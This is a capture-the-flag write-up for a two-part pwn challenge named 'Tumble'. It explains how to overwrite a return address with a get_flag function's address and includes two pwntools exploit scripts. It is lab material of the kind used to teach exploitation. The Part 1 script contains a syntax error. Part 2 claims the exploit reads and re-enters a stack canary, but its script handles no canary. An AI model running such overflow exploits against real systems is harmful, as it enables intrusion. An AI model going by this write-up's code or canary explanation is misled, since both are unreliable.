### PWN
# Tumble
#### 012292024
----

## Part 1

We are explicitly given the stack, and are told our input can be at most 8 characters. Inputting anything more than that overflows things, and we can see what changes. To find the address of the read flag function, we can run `readelf <executable name> -a | grep flag`, which returns:

`1. 23: 00000000004011d6 56 FUNC GLOBAL DEFAULT 15 get_flag`

This gives us the memory address we need to overflow on top of the next instruction. We can either do some math to figure out how much garbage to precede this input with, or just send the target address repeatedly until it works. This script does the latter, printing the flag:

```python
#!/usr/bin/env python3
# To run locally, just run this python program
# To run on remote, pass the string `REMOTE` as an argument

from pwn import *

BIN_PATH = "./PATH_OF_BINARY_HERE"
HOST = "REMOTE_HOST_HERE"
PORT = PORT_NUMBER_HERE


p = process(BIN_PATH) if not args.REMOTE else remote(HOST, PORT)

payload = (8 * p64(0x004011d6) # spam bc math is for nerds
p.sendline(payload)

p.interactive()
```

## Part 2

Part 2 of this challenge is similar to part 1, but includes a unique and random stack canary. Stack canaries are a sort of signature that must continue to exist after a function executes before it executes the next set of instructions. In order to correctly overflow input again to access the flag, we need to read and re-input the canary. This can be done with this script (the official solve script):

```python
from pwn import *

context.log_level = "error"
context.binary = "./return"

io = remote("localhost", 1325)

payload = b"a"*8  # buffer
payload += b"a"*8  # saved base pointer
payload += p64(context.binary.symbols["get_flag"])  # get flag address (return addr overwrite)

io.sendlineafter(b"Input: ", payload)
io.recvuntil(b"Flag:\n")
print("flag:", io.recvlineS(False))
```
